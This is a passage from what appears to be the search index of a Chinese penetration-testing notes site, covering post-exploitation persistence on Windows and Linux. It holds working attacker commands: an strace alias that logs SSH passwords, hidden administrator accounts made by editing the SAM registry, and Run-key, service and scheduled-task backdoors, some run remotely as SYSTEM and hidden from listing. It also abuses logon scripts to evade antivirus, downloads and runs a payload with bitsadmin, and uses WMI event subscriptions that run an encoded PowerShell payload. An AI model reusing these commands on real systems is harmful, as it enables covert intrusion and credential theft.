\u6ca1\u6709\u94fe\u63a5\u7684\u60c5\u51b5\u4e0b\u662f\u65e0\u6cd5\u770b\u5230\u8fdb\u7a0b\u7684\uff0clast\u4e5f\u770b\u4e0d\u5230\u767b\u5f55\uff0c\u5f88\u9690\u853d","title":"Wrapper\u540e\u95e8"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#ssh-keylogger","text":"vim\u5f53\u524d\u7528\u6237\u7684.bashrc\u6587\u4ef6 \\~/.bashrc\uff0c\u672b\u5c3e\u6dfb\u52a0 alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh' \u7136\u540e\u6267\u884c\u547d\u4ee4 source .bashrc,\u4f7f\u914d\u7f6e\u751f\u6548\u3002 \u968f\u540e\u5f53\u672c\u5730su\u6216\u8005ssh\u65f6\uff0c\u64cd\u4f5c\u8bb0\u5f55\u5c31\u4f1a\u88ab\u8bb0\u5f55\u5230/tmp\u76ee\u5f55\u4e0b\u3002","title":"SSH keylogger"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#windows","text":"","title":"WINDOWS"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_5","text":"","title":"\u5f71\u5b50\u7528\u6237"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_6","text":"net user ddd$ /add net localgroup administrators ddd$ /add \u8fd9\u6837\u7684\u8bdd\uff0cnet user\u547d\u4ee4\u5c31\u770b\u4e0d\u5230\u8fd9\u4e2a\u7528\u6237\u4e86 \u4f46\u662f\u5176\u4ed6\u5982\u6ce8\u518c\u8868\uff0c\u7528\u6237\u7ba1\u7406\u754c\u9762\u548c\u767b\u9646\u754c\u9762\u90fd\u4f1a\u53d1\u73b0\u6b64\u7528\u6237\uff0c\u6240\u4ee5\u8bf4\u9690\u853d\u6027\u4e0d\u9ad8\u3002","title":"\\$ \u7b26\u53f7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_7","text":"\u6211\u4eec\u8981\u5bf9HEKY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\User \u8fdb\u884c\u4e00\u4e9b\u4fee\u6539\uff0c\u4f46\u662f\u9ed8\u8ba4\u8fd9\u6709SYSTEM\u53ef\u4ee5\u4fee\u6539SAM\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u76f8\u5173\u6743\u9650\uff1a\u770b\u56fe\u8bf4\u8bdd \u5728names\u4e2d\u627e\u5230\u9690\u85cf\u7528\u6237\u5bf9\u5e94\u7684\u503c\uff0c\u7136\u540e\u53bb\u4e0a\u5c42\u6bd4\u5bf9\u3002 \u53ef\u4ee5\u53d1\u73b0\u9690\u85cf\u7528\u6237\u7684\u503c\u4e3a3f0\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u628a1f4\uff08\u7ba1\u7406\u5458\u8868\u9879\uff09\u7684F\u503c\u590d\u5236\u52303f0\u4e2d\u3002 \u590d\u5236\u540e\uff0c\u5c063f0\u548c\u533f\u540d\u7528\u6237\u7684\u8868\u9879\u53f3\u952e\u5bfc\u51fa\u3002 \u7136\u540e\u628a\u6211\u4eec\u7684\u533f\u540d\u7528\u6237\u5220\u9664 \u7136\u540e\u53cc\u51fb\u4e24\u4e2a\u5bfc\u51fa\u7684\u8868\u9879. \u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u8fd9\u4e2a\u533f\u540d\u7528\u6237\u5c31\u53ea\u6709\u5728\u6ce8\u518c\u8868\u53ef\u89c1\u4e86\u3002","title":"\u4fee\u6539\u6ce8\u518c\u8868"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_8","text":"","title":"\u542f\u52a8\u9879"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_9","text":"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup \u6709\u4e9b\u65f6\u5019\u8fd9\u4e2a\u6587\u4ef6\u5939\u4f1a\u6539\u53d8\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6ce8\u518c\u8868\u952e\u503c\u6765\u786e\u5b9a HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders \u628a\u5e94\u7528\u7a0b\u5e8f\u7684\u5feb\u6377\u65b9\u5f0f\u653e\u8fdb\u53bb\u6709\u6548\uff0c\u4f46\u662f\u76f4\u63a5\u653e\u5e94\u7528\u7a0b\u5e8f\u8fdb\u53bb\u5c31\u4f1a\u5931\u6548\u3002","title":"\u5f00\u59cb\u83dc\u5355\u542f\u52a8\u9879"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_10","text":"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microft\\windows\\currentversion\\run \u547d\u4ee4 reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\test.bat\" /f","title":"\u542f\u52a8\u9879\u6ce8\u518c\u8868\u540e\u95e8"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_11","text":"\u670d\u52a1\u540e\u95e8\u5f80\u5f80\u62e5\u6709SYSTEM\u6743\u9650 \u5c06exe\u6728\u9a6c\u6dfb\u52a0\u5230\u81ea\u542f\u52a8\u670d\u52a1\u4e2d sc create \"GoogleUpdated\" binpath= \"C:\\Users\\Administrator\\Desktop\\test.exe\" sc description \"GoogleUpdated\" \"description\" \u8bbe\u7f6e\u670d\u52a1\u7684\u63cf\u8ff0\u5b57\u7b26\u4e32 sc config \"GoogleUpdated\" start= auto \u8bbe\u7f6e\u8fd9\u4e2a\u670d\u52a1\u4e3a\u81ea\u52a8\u542f\u52a8 net start \"GoogleUpdated\" \u542f\u52a8\u670d\u52a1 \u5982\u679c\u76f4\u63a5\u7528\u666e\u901a\u540e\u95e8\u6765\u505a\u670d\u52a1\u540e\u95e8\uff0c\u90a3\u4e48\u5c31\u4f1a\u51fa\u95ee\u9898\uff1a windows\u4e0b\u7684\u670d\u52a1\u542f\u52a8\u540e\u82e5\u672a\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\u4e0e\u670d\u52a1\u4e2d\u5fc3\u901a\u4fe1\u5219\u4f1a\u88ab\u7ec8\u6b62\u3002 \u4f46\u662fCS\u53ef\u4ee5\u76f4\u63a5\u751f\u6210\u670d\u52a1\u9a6c\u3002","title":"\u670d\u52a1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_12","text":"schtasks /create /sc minute /mo 5 /tn \"chrome\" /tr c:\\test.bat schtasks /create /sc minute /mo 1 /tn \"chrome\" /tr wscript.exe C:\\Users\\AppData\\Local\\Temp\\13442980_crypted.vbs schtasks /create /tn foo1 /tr C:\\Windows\\apppatch\\windows.exe /sc once /st 05:25 /S 18.217.*.* /RU System schtasks /create /s 192.168.1.2 /u administrator /p Passw0rd! /ru \"SYSTEM\" /tn adduser /sc DAILY /tr c:\\wmpub\\add.bat/F schtasks /create /s 192.168.1.2 /u administrator/p Passw0rd! /ru \"SYSTEM\" /tn adduser /sc DAILY /tr \\\\192.168.1.2\\c$\\windows\\beacon.exe schtasks /run /s 192.168.1.2 /u administrator /pPassw0rd! /tn adduser /i /s\u6307\u5b9a\u8fdc\u7a0b\u673a\u5668\u540d\u6216ip\u5730\u5740\uff0c/ru\u6307\u5b9a\u8fd0\u884c\u4efb\u52a1\u7684\u7528\u6237\u6743\u9650\uff0c\u8fd9\u91cc\u6307\u5b9a\u4e3a\u6700\u9ad8\u7684 SYSTEM \uff0c/tn\u662f\u4efb\u52a1\u540d\u79f0\uff0c/sc\u662f\u4efb\u52a1\u8fd0\u884c\u9891\u7387\uff0c\u8fd9\u91cc\u6307\u5b9a\u4e3a\u6bcf\u5929\u8fd0\u884c\uff0c\u5e76\u6ca1\u4ec0\u4e48\u5b9e\u9645\u610f\u4e49\uff0c/tr\u6307\u5b9a\u8fd0\u884c\u7684\u6587\u4ef6\uff0c/F\u8868\u793a\u5982\u679c\u6307\u5b9a\u7684\u4efb\u52a1\u5df2\u7ecf\u5b58\u5728\uff0c\u5219\u5f3a\u5236\u521b\u5efa\u4efb\u52a1\u5e76\u6291\u5236\u8b66\u544a\u3002/i\u8868\u793a \u7acb\u5373\u8fd0\u884c","title":"\u8ba1\u5212\u4efb\u52a1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_13","text":"\u4fee\u6539HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\test\u4e2d\u4efb\u52a1\u5bf9\u5e94\u7684index\u503c\uff08\u9ed8\u8ba43\uff09\uff0c\u4fee\u6539\u4e3a0\u3002\u65e0\u6cd5\u4fee\u6539\u65f6\u9700\u8981\u66f4\u6539\u6743\u9650\uff0c\u5c06\u6240\u6709\u8005\u6539\u4e3aadministrators\uff0c\u5e76\u8d4b\u4e88\u6240\u6709\u6743\u9650\u3002 \u8d4b\u4e88\u4e3a0\u540e\u65e0\u6cd5\u76f4\u63a5\u67e5\u770b\u4efb\u52a1\u3002 \u8fd9\u6837schtasks\u548c\u4efb\u52a1\u67e5\u770b\u5668\u5747\u4e0d\u80fd\u770b\u89c1\u6b64\u4efb\u52a1\u3002 \u6b64\u5916win10\u8fd8\u53ef\u4ee5\u5220\u9664C:\\Windows\\System32\\Tasks \u4e0b\u5bf9\u5e94\u4efb\u52a1\u540d\u7684\u6587\u4ef6\uff0c\u4ee5\u4fbf\u8fbe\u5230\u66f4\u597d\u7684\u9690\u85cf\u76ee\u7684\u3002\uff08win10\u4ee5\u5916\u7248\u672c \u5220\u9664\u6b64\u6587\u4ef6\u4f1a\u5bfc\u81f4\u4efb\u52a1\u65e0\u6cd5\u8fd0\u884c\uff09 \u4f46\u8fd9\u79cd\u9690\u85cf\u65b9\u5f0f\u53ef\u4ee5\u7528\u547d\u4ee4 schtasks /query /tn \u4efb\u52a1\u540d\u6765\u67e5\u770b\uff08\u4efb\u52a1\u540d\u53ef\u4ee5\u901a\u8fc7\u6ce8\u518c\u8868\u67e5\u770b\uff09\u3002 \u4e3a\u4e86\u907f\u514d\u88ab\u8fd9\u6837\u6392\u67e5\u51fa\u6765\uff0c\u5728win10\u4e0b\u53ef\u4ee5\u5220\u9664C:\\Windows\\System32\\Tasks \u4e0b\u5bf9\u5e94\u6587\u4ef6\u5e76\u5220\u9664HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\test\u4e2dSD\u503c","title":"\u9690\u85cf"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#logon-scripts","text":"Logon Scripts\u4f18\u5148\u4e8e av \u5148\u6267\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u7ed5\u8fc7 av \u7684\u654f\u611f\u64cd\u4f5c\u62e6\u622a \u5728HKEY_CURRENT_USER\\Environment\u8868\u9879\u521b\u5efa\u4e00\u4e2a\u503c\u4e3a UserInitMprLogonScript ,\u503c\u4e3a\u6211\u4eec\u8981\u542f\u52a8\u7684\u7a0b\u5e8f\u8def\u5f84\u3002 \u7528\u6237\u91cd\u65b0\u767b\u9646\u540e\u540e\u95e8\u88ab\u542f\u52a8\u3002 WIN7\u53ef\u884c","title":"Logon Scripts"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_14","text":"\u5f00\u59cb->\u8fd0\u884c->\u952e\u5165\"gpedit.msc\"->\u672c\u5730\u7ec4\u7b56\u7565\u7f16\u8f91\u5668->window\u8bbe\u7f6e(system)->\u811a\u672c->\u542f\u52a8->\u5c5e\u6027 \u70b9\u51fb\u663e\u793a\u6587\u4ef6: C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup \u628a\u6211\u4eec\u7684\u540e\u95e8\u7a0b\u5e8f\u590d\u5236\u5230\u8fd9\u4e2a\u8def\u5f84,\u7136\u540e\u8fd9\u4e2a\u811a\u672c\u5f00\u673a\u5c31\u4f1a\u81ea\u52a8\u52a0\u8f7d\u6267\u884c\u4e86\u3002 win7\u4e0b\u590d\u73b0\u5931\u8d25\u3002\u53cd\u6b63\u6709\u8fd9\u4e2a\u73a9\u610f\uff0c\u6211\u770b\u522b\u4eba\u62ff2003\u590d\u73b0\u6210\u529f\u4e86\uff0c\u5bb9\u6613\u88ab\u67e5\u6740\u3002 \u5f53\u7136\u4e5f\u53ef\u4ee5\u5728\u57df\u63a7\u673a\u5668\u4e0a\u901a\u8fc7\u7ec4\u7b56\u7565\u4e0b\u53d1\u6b64\u811a\u672c\u6765\u4f7f\u57df\u4e2d\u4eba\u5458\u767b\u9646\u65f6\u4e0a\u7ebf\u3002\u4e0d\u8fc7\u8fd9\u4e0d\u5728\u672c\u6587\u8ba8\u8bba\u8303\u7574\u4e4b\u5185\u4e86\u3002","title":"\u7ec4\u7b56\u7565\u540e\u95e8"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#guest","text":"Guest\u7528\u6237\u672c\u8eab\u5c31\u5b58\u5728\u4e8e\u8ba1\u7b97\u673a\u4e2d\uff0c\u4f46\u662f\u4e00\u822c\u9ed8\u8ba4\u7981\u6b62\uff0c\u4e14\u4e0d\u53ef\u767b\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u6fc0\u6d3bGuest\u7528\u6237\u5e76\u8d4b\u4e88\u7ba1 \u7406\u5458\u6743\u9650\uff0c\u5e76\u5141\u8bb8\u8fdc\u7a0b\u684c\u9762\u767b\u5f55\u3002 net user Guest /active:yes net user Guest guest@123456 net localgroup Administrators Guest /ADD gpedit.msc->\u8ba1\u7b97\u673a\u914d\u7f6e->windows\u8bbe\u7f6e->\u5b89\u5168\u8bbe\u7f6e->\u672c\u5730\u7b56\u7565->\u7528\u6237\u6743\u9650\u5206\u914d->\u5141\u8bb8\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u767b\u5f55 \u6dfb\u52a0Guest","title":"\u542f\u7528GUEST"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#bitsadmin","text":"bitsadmin\u6307\u4ee4\u4e00\u822c\u662f\u7528\u4e8e\u4e0b\u8f7d\u6587\u4ef6\u7684\uff0c\u4f46\u5b83\u4e5f\u53ef\u4ee5\u7528\u4e8e\u6301\u4e45\u5316\u3002 bitsadmin\u7684SetNotifyCmdLine\u53c2\u6570\u610f\u662f\u7528\u4e8e\u4e0b\u8f7d\u6587\u4ef6\u540e\u7d27\u968f\u5176\u540e\u8c03\u7528\u4e00\u4e2a\u547d\u4ee4\uff0c\u4f46\u662f\u8fd9\u4e2a\u53c2\u6570\u88ab\u9ed1\u5ba2\u5229\u7528\u540e\u5c31\u6210\u4e86\u4e00\u4e2a\u5f88\u4e0d\u9519\u7684\u540e\u95e8\u3002 bitsadmin /create backdoor \u521b\u5efa\u4e00\u4e2abitsadmin\u4efb\u52a1backdoor bitsadmin /addfile backdoor http://a.com/a.exe c:\\temp\\a.exe \u6dfb\u52a0\u4e00\u4e2a\u4efb\u52a1\u5217\u8868\uff0c\u5c06\u8fdc\u7a0b\uff08\u672c\u5730\uff09\u7684\u4e00\u4e2a\u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730 bitsadmin /SetNotifyCmdLine backdoor c:\\users\\hacker\\evil.exe nul \u5012\u6570\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8981\u6253\u5f00\u7684\u5e94\u7528\u7a0b\u5f0f\uff0c\u5012\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6253\u5f00\u6587\u4ef6\u65f6\u9644\u52a0\u7684\u53c2\u6570 bitsadmin /SetMinRetryDelay \"backdoor\" 60 \u6bcf60\u79d2\u91cd\u8bd5\u4efb\u52a1 bitsadmin /resume backdoor \u8c03\u7528\u6307\u5b9a\u4efb\u52a1 \u6211\u4eec\u6267\u884c\u5b8c\u4ee5\u4e0a\u6307\u4ee4\u540e\uff0c\u4f1a\u9a6c\u4e0a\u547d\u4ee4\u6267\u884c\u4e00\u6b21\uff08SetNotifyCmdLine\u4e2d\u6307\u5b9a\u7684cmd\u547d\u4ee4\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u662f\u4ec5\u4ec5\u6267\u884c\u4e86\u6211\u4eec\u7684\u6076\u610fEXE\uff09\u3002 \u91cd\u542f\u540e\u53d1\u73b0\u4efb\u52a1\u4f9d\u7136\u5b58\u5728 \u6309\u7406\u8bf4\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u6211\u7684\u9a6c\u5c31\u4f1a\u88ab\u6267\u884c\u4e00\u6b21\uff0c\u4f46\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\uff0c\u4e0d\u77e5\u9053\u4e3a\u4f55\u3002","title":"BITSADMIN\u540e\u95e8"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#wmi","text":"","title":"WMI"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#wmi_1","text":"\u4f60\u53ef\u4ee5\u7528WMI\u6765\u5b58\u50a8\u4f60\u7684shellcode,\u6076\u610f\u6587\u4ef6\u8def\u5f84\u7b49\uff0c\u8fd9\u79cd\u5b58\u50a8\u65b9\u5f0f\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u9690\u853d $StaticClass = New-Object Management.ManagementClass('root\\cimv2',$null,$null) #\u65b0\u5efawmi\u7c7b $StaticClass.Name = \"a\" #\u8bbe\u7f6ewmi\u7c7b\u540d $StaticClass.Properties.Add('key',\"shellcode\") #\u8bbe\u7f6ewmi\u5c5e\u6027\u952e\u503c $StaticClass.put() #\u63d0\u4ea4\u4ee5\u4e0a\u66f4\u6539 ##\u8bbf\u95ee\u4fe1\u606f ([WmiClass] 'a').Properties['key'].Value","title":"\u4f7f\u7528WMI\u5b58\u50a8\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/win%26linux%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_15","text":"\u8fd9\u4e2a\u540e\u95e8\u662f\u8fd9\u4e48\u5b9e\u73b0\u7684 1.\u8bbe\u5b9a\u4e00\u4e2a\u4e8b\u4ef6\u8fc7\u6ee4\u5668\uff0c\u7528\u4e8e\u76d1\u542c\u4e8b\u4ef6\u5982\u5f00\u673a\uff0c\u542f\u52a8\u67d0\u5e94\u7528\u7b49\u7b49 2.\u8bbe\u5b9a\u4e00\u4e2a\u4e8b\u4ef6\u5904\u7406\u5668\uff0c\u7528\u4e8e\u8bbe\u7f6e\u76d1\u542c\u5230\u67d0\u4e8b\u4ef6\u53d1\u751f\u540e\u6240\u91c7\u53d6\u7684\u884c\u52a8 3.\u5c06\u8fc7\u6ee4\u5668\u548c\u5904\u7406\u5668\u7ed1\u5b9a\u5728\u4e00\u8d77 $$EncodedPayload=\"\" ## \u6784\u9020 WMI\u6c38\u4e45\u4e8b\u4ef6\u8ba2\u9605(permanent event subscriptions) $filterName='EvilFilter' $consumerName='EvilConsumer' ## 1. \u521b\u5efa\u4e00\u4e2a \u4e8b\u4ef6\u8fc7\u6ee4\u5668__EventFilter,\u7528\u4e8e\u8bbe\u5b9a\u89e6\u53d1\u6761\u4ef6,\u6bcf\u969460s\u6267\u884c\u4e00\u6b21 $Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" ## or $Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320\" ## \u4e8b\u4ef6\u7b5b\u9009\u5668\u5728\u7cfb\u7edf\u542f\u52a8\u540e\u7684 200 \u548c 320 \u79d2\u4e4b\u95f4\u88ab\u5f53\u4f5c\u4e00\u4e2a\u89e6\u53d1\u5668\u3002\u5728\u4e8b\u4ef6\u88ab\u89e6\u53d1\u65f6\u4e8b\u4ef6\u6d88\u8d39\u8005\u4f1a\u4f7f\u7528 CommandLineEventConsumer \u6267\u884c\u5df2\u6307\u5b9a\u597d\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002 $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace \"root\\subscription\" -Arguments @{Name=$filterName;EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=$Query} -ErrorAction Stop ## 2. \u521b\u5efa\u4e00\u4e2a \u4e8b\u4ef6\u6d88\u8d39\u8005 CommandLineEventConsumer ,\u7528\u4e8e\u8bbe\u5b9a\u6267\u884c\u7684\u64cd\u4f5c $Arg =@{Name=$consumerName;CommandLineTemplate=\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonInteractive -enc $EncodedPayload\"} $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments $Arg ## 3. \u7ed1\u5b9afilter\u548cconsumer Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\\subscription\" -Arguments 